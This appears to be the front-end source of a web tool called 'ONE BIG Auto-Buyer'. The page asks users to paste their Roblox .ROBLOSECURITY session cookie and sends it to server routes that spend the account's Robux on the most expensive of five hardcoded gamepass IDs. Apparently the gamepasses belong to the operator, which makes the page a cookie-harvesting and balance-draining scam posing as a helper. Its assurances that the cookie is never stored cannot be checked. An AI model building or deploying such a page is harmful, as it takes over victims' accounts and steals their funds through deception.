'use client';

import { useState, useEffect } from 'react';

export default function Home() {
    const [cookie, setCookie] = useState("");
    const [loading, setLoading] = useState(false);
    const [balance, setBalance] = useState(null);
    const [purchasePlan, setPurchasePlan] = useState(null);
    const [result, setResult] = useState(null);
    const [error, setError] = useState("");

    // Permanent gamepasses
    const gamepasses = [
        { id: 1625035642, name: "Gamepass 1", price: 100 },
        { id: 1622525251, name: "Gamepass 2", price: 500 },
        { id: 1624010914, name: "Gamepass 3", price: 1000 },
        { id: 1623035189, name: "Gamepass 4", price: 2000 },
        { id: 1622987145, name: "Gamepass 5", price: 5000 }
    ];

    const checkBalance = async () => {
        if (!cookie.trim()) {
            setError("Please enter your cookie first");
            return;
        }

        setLoading(true);
        setError("");
        setBalance(null);
        setPurchasePlan(null);
        setResult(null);

        try {
            const response = await fetch('/api/balance', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie: cookie.trim() })
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.error || 'Failed to check balance');
            }

            setBalance(data.balance);
            setPurchasePlan(data.purchasePlan);
        } catch (err) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    };

    const startAutoBuy = async () => {
        if (!cookie.trim()) {
            setError("Please enter your cookie first");
            return;
        }

        if (!balance || balance <= 0) {
            setError("Please check your balance first");
            return;
        }

        if (!purchasePlan || purchasePlan.purchases.length === 0) {
            setError("Not enough Robux for any gamepass");
            return;
        }

        setLoading(true);
        setError("");
        setResult(null);

        try {
            const response = await fetch('/api/autobuy', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie: cookie.trim() })
            });

            const data = await response.json();

            if (!response.ok && !data.success) {
                throw new Error(data.error || 'Failed to process auto-buy');
            }

            setResult(data);
            // Refresh balance after purchase
            setTimeout(checkBalance, 2000); // Wait 2 seconds then refresh
        } catch (err) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    };

    const getPurchaseMessage = () => {
        if (!purchasePlan || purchasePlan.purchases.length === 0) {
            return null;
        }
        
        const purchase = purchasePlan.purchases[0];
        return `Will purchase: ${purchase.name} (${purchase.price} Robux)`;
    };

    return (
        <div className="container">
            <div style={{
                maxWidth: '800px',
                margin: '40px auto',
                background: 'white',
                borderRadius: '12px',
                padding: '40px',
                boxShadow: '0 10px 40px rgba(0,0,0,0.1)'
            }}>
                <h1 style={{ 
                    textAlign: 'center', 
                    marginBottom: '10px',
                    color: '#333',
                    fontSize: '32px',
                    fontWeight: 'bold'
                }}>
                    🎮 ONE BIG Auto-Buyer
                </h1>
                <p style={{ 
                    textAlign: 'center', 
                    color: '#666',
                    marginBottom: '30px',
                    fontSize: '16px'
                }}>
                    Automatically purchases the MOST EXPENSIVE gamepass you can afford
                </p>
                
                <div style={{ marginBottom: '30px' }}>
                    <label style={{ 
                        display: 'block', 
                        marginBottom: '8px',
                        fontWeight: '600',
                        color: '#555',
                        fontSize: '14px'
                    }}>
                        .ROBLOSECURITY Cookie:
                    </label>
                    <textarea
                        value={cookie}
                        onChange={(e) => setCookie(e.target.value)}
                        placeholder="Paste your .ROBLOSECURITY cookie here"
                        rows="3"
                        style={{
                            width: '100%',
                            padding: '12px',
                            border: '1px solid #ddd',
                            borderRadius: '6px',
                            fontSize: '14px',
                            fontFamily: 'monospace',
                            resize: 'vertical'
                        }}
                    />
                </div>

                <div style={{ 
                    display: 'flex', 
                    gap: '10px',
                    marginBottom: '30px'
                }}>
                    <button 
                        onClick={checkBalance}
                        disabled={loading || !cookie.trim()}
                        style={{
                            flex: 1,
                            padding: '12px',
                            background: loading ? '#ccc' : '#10b981',
                            color: 'white',
                            border: 'none',
                            borderRadius: '6px',
                            fontSize: '16px',
                            fontWeight: '600',
                            cursor: loading ? 'not-allowed' : 'pointer'
                        }}
                    >
                        {loading ? '🔄 Checking...' : '💰 Check Balance'}
                    </button>
                    
                    <button 
                        onClick={startAutoBuy}
                        disabled={loading || !balance || !purchasePlan?.purchases?.length}
                        style={{
                            flex: 1,
                            padding: '12px',
                            background: (!balance || !purchasePlan?.purchases?.length) ? '#ccc' : '#ef4444',
                            color: 'white',
                            border: 'none',
                            borderRadius: '6px',
                            fontSize: '16px',
                            fontWeight: '600',
                            cursor: (!balance || !purchasePlan?.purchases?.length) ? 'not-allowed' : 'pointer'
                        }}
                    >
                        🚀 Buy Most Expensive
                    </button>
                </div>

                {error && (
                    <div style={{
                        marginBottom: '20px',
                        padding: '15px',
                        background: '#ffebee',
                        color: '#c62828',
                        borderRadius: '6px',
                        borderLeft: '4px solid #c62828'
                    }}>
                        <strong>❌ Error:</strong> {error}
                    </div>
                )}

                {/* Balance Display */}
                {balance !== null && (
                    <div style={{
                        marginBottom: '30px',
                        padding: '20px',
                        background: '#f0f9ff',
                        borderRadius: '8px',
                        border: '2px solid #0ea5e9'
                    }}>
                        <h3 style={{ 
                            marginBottom: '15px', 
                            color: '#0369a1',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '8px'
                        }}>
                            💰 Your Robux Balance
                        </h3>
                        <div style={{ 
                            fontSize: '32px', 
                            fontWeight: 'bold',
                            color: '#0ea5e9',
                            marginBottom: '20px',
                            textAlign: 'center'
                        }}>
                            {balance.toLocaleString()} Robux
                        </div>
                        
                        {purchasePlan && purchasePlan.purchases.length > 0 ? (
                            <div>
                                <div style={{
                                    background: 'white',
                                    padding: '20px',
                                    borderRadius: '8px',
                                    textAlign: 'center',
                                    border: '2px solid #10b981'
                                }}>
                                    <div style={{ 
                                        fontSize: '14px', 
                                        color: '#64748b',
                                        marginBottom: '10px'
                                    }}>
                                        ONE BIG Strategy:
                                    </div>
                                    <div style={{ 
                                        fontSize: '20px', 
                                        fontWeight: 'bold',
                                        color: '#10b981',
                                        marginBottom: '5px'
                                    }}>
                                        {purchasePlan.purchases[0].name}
                                    </div>
                                    <div style={{ 
                                        fontSize: '24px', 
                                        fontWeight: 'bold',
                                        color: '#059669'
                                    }}>
                                        {purchasePlan.purchases[0].price} Robux
                                    </div>
                                </div>
                                
                                <div style={{
                                    display: 'flex',
                                    justifyContent: 'space-between',
                                    marginTop: '20px',
                                    paddingTop: '15px',
                                    borderTop: '2px solid #e5e7eb'
                                }}>
                                    <div>
                                        <div style={{ fontSize: '12px', color: '#64748b' }}>Will Spend</div>
                                        <div style={{ fontSize: '18px', fontWeight: 'bold' }}>{purchasePlan.totalSpent} Robux</div>
                                    </div>
                                    <div>
                                        <div style={{ fontSize: '12px', color: '#64748b' }}>Will Remain</div>
                                        <div style={{ fontSize: '18px', fontWeight: 'bold', color: '#f59e0b' }}>{purchasePlan.remainingBalance} Robux</div>
                                    </div>
                                </div>
                            </div>
                        ) : (
                            <div style={{
                                background: '#fffbeb',
                                padding: '15px',
                                borderRadius: '6px',
                                textAlign: 'center',
                                border: '1px solid #fbbf24'
                            }}>
                                <p style={{ color: '#b45309', fontWeight: '600' }}>
                                    ❌ Not enough Robux for any gamepass
                                </p>
                                <p style={{ color: '#92400e', fontSize: '14px', marginTop: '5px' }}>
                                    Minimum required: 100 Robux
                                </p>
                            </div>
                        )}
                    </div>
                )}

                {/* Result Display */}
                {result && (
                    <div style={{
                        marginBottom: '30px',
                        padding: '20px',
                        background: '#e8f5e9',
                        borderRadius: '8px',
                        borderLeft: '4px solid #2e7d32'
                    }}>
                        <h3 style={{ 
                            marginBottom: '15px', 
                            display: 'flex', 
                            alignItems: 'center',
                            gap: '8px',
                            color: '#2e7d32'
                        }}>
                            ✅ Purchase Complete!
                        </h3>
                        
                        <div style={{
                            background: 'white',
                            padding: '20px',
                            borderRadius: '8px',
                            marginBottom: '15px'
                        }}>
                            <div style={{ 
                                display: 'grid', 
                                gridTemplateColumns: 'repeat(2, 1fr)',
                                gap: '15px',
                                marginBottom: '20px'
                            }}>
                                <div>
                                    <div style={{ fontSize: '12px', color: '#64748b' }}>Original Balance</div>
                                    <div style={{ fontSize: '20px', fontWeight: 'bold' }}>{result.originalBalance} Robux</div>
                                </div>
                                <div>
                                    <div style={{ fontSize: '12px', color: '#64748b' }}>Final Balance</div>
                                    <div style={{ fontSize: '20px', fontWeight: 'bold' }}>{result.finalBalance} Robux</div>
                                </div>
                                <div>
                                    <div style={{ fontSize: '12px', color: '#64748b' }}>Total Spent</div>
                                    <div style={{ fontSize: '20px', fontWeight: 'bold', color: '#ef4444' }}>{result.totalSpent} Robux</div>
                                </div>
                                <div>
                                    <div style={{ fontSize: '12px', color: '#64748b' }}>Items Purchased</div>
                                    <div style={{ fontSize: '20px', fontWeight: 'bold', color: '#10b981' }}>{result.summary?.totalPurchases || 1}</div>
                                </div>
                            </div>
                            
                            <div style={{
                                textAlign: 'center',
                                padding: '15px',
                                background: '#d1fae5',
                                borderRadius: '6px',
                                border: '1px solid #a7f3d0'
                            }}>
                                <div style={{ fontSize: '16px', fontWeight: '600', color: '#065f46' }}>
                                    {result.message}
                                </div>
                            </div>
                        </div>
                        
                        <div style={{
                            display: 'flex',
                            justifyContent: 'space-around',
                            textAlign: 'center',
                            background: '#f8fafc',
                            padding: '15px',
                            borderRadius: '6px'
                        }}>
                            <div>
                                <div style={{ fontSize: '24px', fontWeight: 'bold', color: '#10b981' }}>
                                    {result.summary?.successful || 1}
                                </div>
                                <div style={{ fontSize: '12px', color: '#64748b' }}>Successful</div>
                            </div>
                            <div>
                                <div style={{ fontSize: '24px', fontWeight: 'bold', color: '#ef4444' }}>
                                    {result.summary?.failed || 0}
                                </div>
                                <div style={{ fontSize: '12px', color: '#64748b' }}>Failed</div>
                            </div>
                        </div>
                    </div>
                )}

                {/* Gamepass Information */}
                <div style={{
                    padding: '20px',
                    background: '#f8fafc',
                    borderRadius: '8px',
                    border: '1px solid #e2e8f0',
                    marginBottom: '30px'
                }}>
                    <h3 style={{ 
                        marginBottom: '15px', 
                        color: '#334155',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px'
                    }}>
                        📋 Available Gamepasses (Most Expensive First)
                    </h3>
                    <div style={{
                        display: 'grid',
                        gap: '10px'
                    }}>
                        {[...gamepasses].sort((a, b) => b.price - a.price).map((gamepass, index) => (
                            <div key={index} style={{
                                display: 'flex',
                                justifyContent: 'space-between',
                                alignItems: 'center',
                                padding: '12px',
                                background: 'white',
                                borderRadius: '6px',
                                border: '1px solid #e5e7eb'
                            }}>
                                <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                                    <div style={{
                                        width: '24px',
                                        height: '24px',
                                        borderRadius: '50%',
                                        background: index === 0 ? '#10b981' : '#3b82f6',
                                        color: 'white',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        fontSize: '12px',
                                        fontWeight: 'bold'
                                    }}>
                                        {index + 1}
                                    </div>
                                    <div>
                                        <div style={{ fontWeight: '600' }}>{gamepass.name}</div>
                                        <div style={{ fontSize: '12px', color: '#6b7280' }}>ID: {gamepass.id}</div>
                                    </div>
                                </div>
                                <div style={{
                                    background: index === 0 ? '#10b981' : '#3b82f6',
                                    color: 'white',
                                    padding: '4px 12px',
                                    borderRadius: '20px',
                                    fontWeight: 'bold',
                                    fontSize: '14px'
                                }}>
                                    {gamepass.price.toLocaleString()} Robux
                                </div>
                            </div>
                        ))}
                    </div>
                    <div style={{ 
                        marginTop: '15px', 
                        padding: '15px',
                        background: '#dbeafe',
                        borderRadius: '6px',
                        borderLeft: '4px solid #3b82f6'
                    }}>
                        <p style={{ 
                            color: '#1e40af',
                            fontSize: '14px',
                            fontWeight: '600',
                            marginBottom: '5px'
                        }}>
                            📝 Purchase Logic:
                        </p>
                        <p style={{ 
                            color: '#1e3a8a',
                            fontSize: '13px',
                            lineHeight: '1.5'
                        }}>
                            The system will buy the <strong>MOST EXPENSIVE</strong> gamepass you can afford.
                            Example: With 5,000 Robux → Gamepass 5, With 3,000 Robux → Gamepass 4, etc.
                        </p>
                    </div>
                </div>

                {/* Examples Section */}
                <div style={{
                    padding: '20px',
                    background: '#fef3c7',
                    borderRadius: '8px',
                    border: '1px solid #fbbf24'
                }}>
                    <h3 style={{ 
                        marginBottom: '15px', 
                        color: '#92400e',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px'
                    }}>
                        📊 Examples
                    </h3>
                    <div style={{
                        display: 'grid',
                        gap: '10px'
                    }}>
                        {[
                            { balance: 5500, purchase: "Gamepass 5 (5000 Robux)", remaining: 500 },
                            { balance: 3000, purchase: "Gamepass 4 (2000 Robux)", remaining: 1000 },
                            { balance: 1500, purchase: "Gamepass 3 (1000 Robux)", remaining: 500 },
                            { balance: 700, purchase: "Gamepass 2 (500 Robux)", remaining: 200 },
                            { balance: 150, purchase: "Gamepass 1 (100 Robux)", remaining: 50 }
                        ].map((example, index) => (
                            <div key={index} style={{
                                display: 'flex',
                                justifyContent: 'space-between',
                                alignItems: 'center',
                                padding: '10px',
                                background: 'white',
                                borderRadius: '6px',
                                border: '1px solid #fbbf24'
                            }}>
                                <div>
                                    <div style={{ fontWeight: '600', color: '#92400e' }}>
                                        {example.balance} Robux Balance
                                    </div>
                                </div>
                                <div style={{ textAlign: 'right' }}>
                                    <div style={{ fontSize: '14px', fontWeight: '600' }}>{example.purchase}</div>
                                    <div style={{ fontSize: '12px', color: '#d97706' }}>{example.remaining} Robux remaining</div>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>

                {/* Important Notes */}
                <div style={{
                    marginTop: '30px',
                    padding: '20px',
                    background: '#fff7ed',
                    borderRadius: '8px',
                    border: '1px solid #fed7aa'
                }}>
                    <h3 style={{ 
                        marginBottom: '15px', 
                        color: '#c2410c',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px'
                    }}>
                        ⚠️ Important Notes
                    </h3>
                    <ul style={{ 
                        paddingLeft: '20px',
                        color: '#9a3412',
                        lineHeight: '1.8'
                    }}>
                        <li><strong>ONE BIG Strategy:</strong> Only buys ONE gamepass - the most expensive you can afford</li>
                        <li><strong>Cookie Security:</strong> Your cookie is processed server-side and never stored</li>
                        <li><strong>Balance Check:</strong> Always check balance before purchasing</li>
                        <li><strong>Rate Limits:</strong> Includes 1-second cooldown between purchases</li>
                        <li><strong>Compliance:</strong> Use responsibly according to Roblox Terms of Service</li>
                    </ul>
                </div>
            </div>
        </div>
    );
}
